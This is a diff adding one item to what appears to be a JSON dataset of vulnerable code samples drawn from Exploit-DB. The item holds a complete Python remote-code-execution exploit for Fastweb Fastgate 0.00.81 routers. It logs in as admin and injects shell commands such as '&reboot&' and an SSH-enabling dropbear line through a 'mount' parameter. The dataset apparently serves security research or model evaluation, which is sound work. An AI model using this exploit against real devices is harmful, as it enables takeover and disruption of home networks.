@@ -5220,6 +5220,27 @@
         "url": "https://www.exploit-db.com/exploits/20199",
         "file_path": "exploits/php/webapps/20199.php"
       }
+    },
+    {
+      "item_id": "code_260",
+      "original_id": "edb_47654",
+      "source": "exploitdb",
+      "language": "python",
+      "vulnerability_types": [
+        "rce"
+      ],
+      "severity": "critical",
+      "code": "# Exploit Title: Fastweb Fastgate 0.00.81 - Remote Code Execution\n# Date: 2019-11-13\n# Exploit Author: Riccardo Gasparini\n# Vendor Homepage: https://www.fastweb.it/\n# Software Link: http://59.0.121.191:8080/ACS-server/file/0.00.81_FW_200_Askey (only from Fastweb ISP network)\n# Version: 0.00.81\n# Tested on: Linux\n# CVE : N/A\n\nimport requests, json, time, sys\n\ncurrent_milli_time = lambda: int(round(time.time() * 1000))\n\npassword='XXXXXXXXXXXXXXX'\n\nif password == 'XXXXXXXXXXXXXXX':\n    print(\"Password is set to XXXXXXXXXXXXXXX\\nOpen the script and change the password\")\n    sys.exit(-1)\n\n#get XSRF-TOKEN\nheaders = {\n    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36',\n    'Referer': 'http://192.168.1.254/tr069',\n}\nparams = ()\nresponse = requests.get('http://192.168.1.254', headers=headers)\n\n#login request and get sessionKey\nxsrfToken=response.cookies['XSRF-TOKEN']\ncookies = {\n    'XSRF-TOKEN': xsrfToken,\n}\nheaders = {\n    'Pragma': 'no-cache',\n    'X-XSRF-TOKEN': xsrfToken,\n    'Accept-Language': 'en-US,en-GB;q=0.9,en;q=0.8,it-IT;q=0.7,it;q=0.6,es;q=0.5,de;q=0.4',\n    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36',\n    'Accept': 'application/json, text/plain, */*',\n    'Referer': 'http://192.168.1.254/tr069',\n    'Accept-Encoding': 'gzip, deflate',\n    'Connection': 'keep-alive',\n    'Cache-Control': 'no-cache',\n}\nparams = (\n    ('_', str(current_milli_time())),\n    ('cmd', '3'),\n    ('nvget', 'login_confirm'),\n    ('password', password),\n    ('remember_me', '1'),\n    ('sessionKey', 'NULL'),\n    ('username', 'admin'),\n)\n\nresponse = requests.get('http://192.168.1.254/status.cgi', headers=headers, params=params, cookies=cookies)\n\njsonResponse = json.loads(response.text)\nsessionKey=jsonResponse[\"login_confirm\"][\"check_session\"]\n\nprint(\"Executing command reboot\\n\")\n\n#some commands as example are shown below in the mount parameter\nparams = (\n    ('_', str(current_milli_time())),\n    ('act','nvset'),\n    ('service','usb_remove'),\n    #Code execution\n    #('mount','&ping -c 10 192.168.1.172&'),\n    #('mount','&dropbear -r /etc/dropbear/dropbear_rsa_host_key&'),#to enable SSH\n    ('mount','&reboot&'),\n    ('sessionKey', sessionKey),\n)\nresponse = requests.get('http://192.168.1.254/status.cgi', headers=headers, params=params, cookies=cookies)\nprint(response.text)\n\n#logout\nparams = (\n    ('_', str(current_milli_time())),\n    ('cmd', '5'),\n    ('nvget', 'login_confirm'),\n    ('sessionKey', sessionKey),\n)\n\nresponse = requests.get('http://192.168.1.254/status.cgi', headers=headers, params=params, cookies=cookies)\nprint(json.dumps(json.loads(response.text), indent=2))",
+      "metadata": {
+        "title": "Fastweb Fastgate 0.00.81 - Remote Code Execution",
+        "author": "Riccardo Gasparini",
+        "date_published": "2019-11-13",
+        "platform": "hardware",
+        "verified": false,
+        "cve_codes": "",
+        "url": "https://www.exploit-db.com/exploits/47654",
+        "file_path": "exploits/hardware/webapps/47654.py"
+      }
     }
   ],
   "statistics": {
